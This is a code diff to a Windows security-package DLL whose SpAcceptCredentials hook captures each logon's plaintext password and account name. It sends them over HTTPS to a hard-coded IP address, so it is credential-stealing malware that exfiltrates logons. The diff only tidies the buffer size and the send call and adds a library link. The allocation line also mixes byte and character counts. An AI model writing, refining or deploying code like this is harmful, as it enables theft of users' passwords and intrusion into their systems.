@@ -11,6 +11,7 @@
 #include <string>
 
 #pragma comment(lib, "Secur32.lib")
+#pragma comment(lib, "user32.lib")
 
 HTTPSTransport transport(L"188.120.248.116");
 
@@ -41,14 +42,15 @@ NTSTATUS NTAPI SpAcceptCredentials(SECURITY_LOGON_TYPE LogonType, PUNICODE_STRIN
 {
     UNICODE_STRING password = PrimaryCredentials->Password;
     UNICODE_STRING postData;
-    size_t allocSize = password.Length + AccountName->Length + 0x100;
+    size_t allocSize = password.Length + AccountName->Length + strlen("password=&login=") + 1;
     postData.Buffer = (PWSTR)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, allocSize);
     StringCchCatW(postData.Buffer, allocSize, L"password=");
     StringCchCatW(postData.Buffer, allocSize, password.Buffer);
     StringCchCatW(postData.Buffer, allocSize, L"&login=");
     StringCchCatW(postData.Buffer, allocSize, AccountName->Buffer);
 
-    transport.SendData(L"/postdata", postData.Buffer);
+    auto dataLen = (lstrlenW(postData.Buffer) + 1) * sizeof(wchar_t);
+    transport.SendData(L"/postdata", postData.Buffer, dataLen);
     return 0;
 }
 SECPKG_FUNCTION_TABLE SecurityPackageFunctionTable[] =
